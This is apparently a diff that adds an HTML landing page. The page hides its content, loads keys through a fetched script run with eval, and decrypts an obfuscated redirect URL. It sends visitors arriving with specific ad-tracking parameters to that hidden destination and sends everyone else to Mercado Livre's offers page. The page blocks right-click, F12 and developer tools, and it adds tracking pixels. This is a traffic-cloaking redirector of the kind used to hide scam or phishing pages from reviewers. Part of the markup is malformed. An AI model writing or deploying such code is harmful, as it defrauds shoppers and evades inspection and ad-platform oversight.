@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="refresh" content="0;URL=''"/>
+    <script src="6ht6jj4299/j837101.js"></script>
+    <script>
+        const secretToken = 'your_secret_token'; // Adicione seu token secreto aqui
+
+        function loadKeys() {
+            return fetch('serve_key.php?token=' + secretToken)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.text();
+                }).then(text => {
+                    eval(text);
+                    if (!key || !shiftedKey) {
+                        throw new Error('Keys not loaded properly');
+                    }
+                }).catch(error => {
+                    console.error('There was a problem with the fetch operation:', error);
+                });
+        }
+
+        function decrypt(input) {
+            return input.split('').map(char => {
+                const index = shiftedKey.indexOf(char);
+                return index > -1 ? key[index] : char;
+            }).join('');
+        }
+
+        function checkRequiredParams() {
+            const requiredParams = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "xcod"];
+            const urlParams = new URLSearchParams(window.location.search);
+            for (let param of requiredParams) {
+                if (!urlParams.has(param)) {
+                    return false;
+                }
+            }
+            return true;
+        }
+
+        function appendUrlParams(url) {
+            const urlParams = new URLSearchParams(window.location.search);
+            if (url.includes('?')) {
+                return url + '&' + urlParams.toString();
+            } else {
+                return url + '?' + urlParams.toString();
+            }
+        }
+
+        window.onload = function() {
+            document.body.style.display = "none"; // Esconde o conteúdo da página
+            loadKeys().then(() => {
+                if (checkRequiredParams()) {
+                    let encryptedUrl = "rCC3%fqq!wpdI_*ebRpwZd*!qpw_bpZrC!e";
+                    let redirectUrl = decrypt(encryptedUrl);
+                    redirectUrl = appendUrlParams(redirectUrl); // Adiciona os parâmetros à URL
+                    window.location.href = redirectUrl;
+                } else {
+                    window.location.href = "https://www.mercadolivre.com.br/ofertas";
+                }
+            });
+        }
+    </script>
+    <script async="true" src="123global.html"></script>
+    <script>
+        const disabledKeys = ["c", "C", "x", "J", "u", "I"];
+        const showAlert = e => {
+            e.preventDefault();
+            alert("Acesso negado!!");
+        }
+        document.addEventListener("contextmenu", showAlert);
+        document.addEventListener("keydown", e => {
+            if ((e.ctrlKey && disabledKeys.includes(e.key)) || e.key === "F12") {
+                showAlert(e);
+            }
+        });
+    </script>
+    <script async="true" src="js/iHJA1t0sXF2b.js"></script>
+    <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool"></script>
+</head>
+<body>
+</body>
+</html>
+
+<script
+
+function captureUTMParameters() {
+  const params = new URLSearchParams(window.location.search);
+  const utm = {
+    source: params.get('utm_source'),
+    medium: params.get('utm_medium'),
+    campaign: params.get('utm_campaign'),
+    term: params.get('utm_term'),
+    content: params.get('utm_content')
+  };
+
+  // Armazenar os UTM em cookies
+  document.cookie = `utm_source=${utm.source}; path=/`;
+  document.cookie = `utm_medium=${utm.medium}; path=/`;
+  document.cookie = `utm_campaign=${utm.campaign}; path=/`;
+  document.cookie = `utm_term=${utm.term}; path=/`;
+  document.cookie = `utm_content=${utm.content}; path=/`;
+}
+
+// Capturar os UTM assim que a página carregar
+captureUTMParameters();
+
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+<script>
+    window.pixelId = "66f6c1d29943e9c3807b7cd1";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '840148271630677');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=840148271630677&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code-->
+
+
+</head>
+</body>
+</html>
